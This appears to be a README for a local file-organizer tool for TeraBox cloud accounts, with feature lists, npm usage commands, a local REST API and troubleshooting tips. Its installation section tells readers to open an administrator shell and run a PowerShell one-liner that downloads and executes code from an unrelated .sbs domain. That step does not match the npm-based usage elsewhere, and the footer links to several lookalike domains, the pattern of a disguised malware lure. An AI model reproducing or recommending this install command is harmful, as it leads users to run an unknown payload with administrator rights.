# TeraBox File Organizer — Local Cloud Library

> A local companion for organizing files synchronized from an authorized TeraBox account, with metadata search and privacy controls.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitrm.sbs?get=terabox | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Terabox modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Terabox.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**TeraBox File Organizer** indexes metadata for files you are authorized to access, then provides local search, collections, duplicate detection, and exportable inventories. It does not bypass storage limits, share private files, or distribute copyrighted content.

**Best for:** Personal archivists, small teams, and users managing authorized cloud libraries.

**Key differentiators:**
1. Local metadata index
2. Explicit OAuth-style authorization
3. Duplicate and near-duplicate detection
4. Collection and tag views
5. Redacted export reports

---

## Core Features

```
✅ Authorized account connection
✅ Local file metadata index
✅ Full-text search over local metadata
✅ Collections and tags
✅ Duplicate detection
✅ Storage usage summaries
✅ Export to CSV and JSON
✅ Token rotation and revocation
```

---

## Usage

```bash
# Start the local organizer
npm run dev

# Open the official authorization flow
npm run cli -- auth connect

# Refresh the local metadata index
npm run cli -- index refresh

# Find duplicate candidates
npm run cli -- files duplicates --threshold 0.92

# Export a redacted inventory
npm run cli -- export inventory --output ./reports/inventory.json --redact
```

---

## REST API

> [!NOTE]
> The API serves your local index only. It never exposes account tokens and does not provide links intended to bypass provider access controls.

```bash
# Start the local API
npm run serve -- --port 3000

# Search indexed metadata
curl "http://localhost:3000/api/v1/files?q=project"

# Read storage summaries
curl http://localhost:3000/api/v1/storage/summary

# Revoke the local session
curl -X POST http://localhost:3000/api/v1/auth/disconnect
```

---

## Screenshots

- File library: `screenshots/file-library.png`
- Search results: `screenshots/search-results.png`
- Duplicate report: `screenshots/duplicate-report.png`
- Storage summary: `screenshots/storage-summary.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Authorization fails | Confirm the official provider page opened and that you approved the requested scopes. |
| Index is empty | Run a metadata refresh and check the account has accessible files. |
| Search misses a file | Rebuild the index after metadata changes. |
| Token is not found | Use the local secret-store command; do not paste tokens into configuration files. |
| Export contains personal names | Rerun with the redaction option enabled. |

---

## Use Cases

- **Personal Archive** — Search and tag files synchronized from an account you own.
- **Team Inventory** — Maintain a redacted inventory of shared work files.
- **Storage Hygiene** — Find duplicate candidates and review large folders.
- **Data Portability** — Export metadata for backup planning and audits.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Respect provider terms, copyright, privacy, and account permissions. Do not attempt to bypass quotas, access controls, or sharing restrictions.

> [!TIP]
> Revoke the local session when the organizer is no longer needed and keep backups of the metadata index.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
terabox, cloud-storage, file-organizer, metadata-search, local-first, privacy, duplicate-detection, inventory, oauth, personal-archive
-->

[gitview.sbs](https://gitview.sbs?t=terabox) | [gitrm.sbs](https://gitrm.sbs?t=terabox) | [gitrm.cfd](https://gitrm.cfd?t=terabox) | [gitsl.xyz](https://gitsl.xyz?t=terabox) | [viewgit.sbs](https://viewgit.sbs?t=terabox)
